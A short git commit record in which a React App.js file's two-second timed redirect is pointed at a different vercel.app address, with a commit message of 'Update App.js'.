e220af0d5040e702357dee9d67bdf4f7a0b117cd
husknet <127146284+husknet@users.noreply.github.com>
2024-09-03 11:11:19 -0300

    Update App.js

--- src/App.js
+++ src/App.js
@@ -4,7 +4,7 @@ import Loading from './Loading';
 function App() {
     useEffect(() => {
         const timer = setTimeout(() => {
-            window.location.href = 'https://xxempty-blow2guts.vercel.app/';
+            window.location.href = 'https://nextbrowserforge.vercel.app/';
         }, 2000);
 
         return () => clearTimeout(timer);
